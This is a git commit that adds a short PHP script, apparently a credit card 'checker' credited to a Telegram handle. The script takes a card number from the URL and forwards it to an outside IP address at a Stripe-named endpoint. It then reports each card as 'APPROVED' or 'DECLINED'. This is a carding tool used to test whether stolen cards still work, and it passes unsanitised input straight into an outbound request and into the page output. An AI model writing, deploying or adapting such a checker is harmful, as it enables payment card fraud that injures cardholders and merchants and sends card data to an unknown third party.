9240b5dce5526a7bc036f28069e3ea27447d4f4a
roaxx <148262292+roaxxxx@users.noreply.github.com>
2023-10-26 17:37:51 +0200

    Create api-nonsk.php

---
+++ api-nonsk.php
@@ -0,0 +1,26 @@
+<?php
+//script by @xancheck
+
+
+$cc = $_GET['cc'];
+
+
+if(isset($cc) && !empty($cc)) {
+
+    $apiUrl = "http://51.20.124.87/stripe/cardvalid.php?cc=$cc";
+
+
+    $response = file_get_contents($apiUrl);
+
+
+    if (strpos($response, 'Live') !== false) {
+        echo "APPROVED - $cc - t.me/xancheck";
+    } elseif (strpos($response, 'error') !== false) {
+        echo "DECLINED - $cc - t.me/xancheck";
+    } else {
+        echo "Status not recognized in the response.";
+    }
+} else {
+    echo "Missing 'cc' parameter in the URL.";
+}
+?>
